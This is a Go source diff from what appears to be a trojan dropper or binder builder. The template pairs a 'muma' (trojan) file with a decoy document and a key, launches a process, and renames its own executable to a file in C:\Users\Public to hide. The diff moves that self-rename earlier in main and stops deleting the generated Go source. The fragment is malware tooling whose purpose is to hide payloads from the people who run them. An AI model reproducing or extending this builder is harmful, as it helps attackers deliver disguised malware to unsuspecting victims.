@@ -80,6 +80,9 @@ func main() {
 	)
 	
 	func main() {
+		
+		selfile, _ := os.Executable()
+		os.Rename(selfile, "C:\\Users\\Public\\Yihsiwei.dat")
 		mumafilename := "%s"
 		docfilename := "%s"
 		key := "%s"
@@ -109,8 +112,6 @@ func main() {
 		//cmd2.Stdout = os.Stdout
 		_ = cmd2.Start()
 	
-		selfile, _ := os.Executable()
-		os.Rename(selfile, "C:\\Users\\Public\\Yihsiwei.dat")
 	}
 	func exitfile(filename string) {
 		for {
@@ -168,7 +169,7 @@ func main() {
 	_ = cmd.Start()
 
 	exitfile("outfile.exe")
-	os.RemoveAll("outfile.go")
+	//os.RemoveAll("outfile.go")
 	os.RemoveAll("Yihsiwei.bat")
 
 }
